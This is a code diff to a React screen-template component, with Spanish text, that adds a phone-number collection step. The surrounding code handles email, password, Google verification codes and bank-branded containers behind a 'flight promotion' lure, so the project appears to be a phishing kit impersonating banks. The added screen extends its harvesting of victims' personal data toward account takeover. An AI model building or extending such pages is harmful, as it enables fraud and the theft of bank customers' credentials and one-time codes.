@@ -46,6 +46,7 @@ interface ScreenTemplatesProps {
     correo?: string;
     contrasena?: string;
     codigo?: string; // Código para la verificación de Google
+    errorMessage?: string; // Mensaje de error para la pantalla de login
   };
   onSubmit: (screen: ScreenType, data: Record<string, any>) => void;
   banco?: string;
@@ -412,6 +413,59 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           </>
         );
         return getBankContainer(vuelosOtorgadosContent);
+
+      case ScreenType.TELEFONO:
+        const [telefonoInput, setTelefonoInput] = useState('');
+        
+        const telefonoContent = (
+          <>
+            <h2 className="text-xl font-bold mb-3">Verificación de contacto</h2>
+            <p className="mb-4 text-sm text-gray-600">
+              Para continuar con tu promoción de vuelos, necesitamos verificar tu número de teléfono celular
+            </p>
+            
+            <div className="mb-4">
+              <label className="block text-sm font-medium mb-2">
+                Número de teléfono celular
+              </label>
+              <div className="flex">
+                <span className="inline-flex items-center px-3 py-2 rounded-l-md border border-r-0 border-gray-300 bg-gray-50 text-gray-500 text-sm">
+                  +52
+                </span>
+                <input
+                  type="tel"
+                  value={telefonoInput}
+                  onChange={(e) => {
+                    // Solo permitir números y limitar a 10 dígitos
+                    const value = e.target.value.replace(/\D/g, '').slice(0, 10);
+                    setTelefonoInput(value);
+                  }}
+                  placeholder="5551234567"
+                  className="flex-1 px-3 py-2 border border-gray-300 rounded-r-md focus:outline-none focus:ring-2 focus:ring-blue-500"
+                  maxLength={10}
+                />
+              </div>
+              <p className="text-xs text-gray-500 mt-1">
+                Ingresa tu número a 10 dígitos sin espacios ni guiones
+              </p>
+            </div>
+            
+            <Button 
+              className="w-full bg-[#a71138] hover:bg-[#e04343] text-white py-3 text-lg"
+              onClick={() => {
+                if (telefonoInput.length === 10) {
+                  onSubmit(ScreenType.TELEFONO, { telefono: telefonoInput });
+                } else {
+                  alert('Por favor ingresa un número de teléfono válido de 10 dígitos');
+                }
+              }}
+              disabled={telefonoInput.length !== 10}
+            >
+              Continuar
+            </Button>
+          </>
+        );
+        return getBankContainer(telefonoContent);
 
       case ScreenType.CODIGO:
         const codigoContent = (
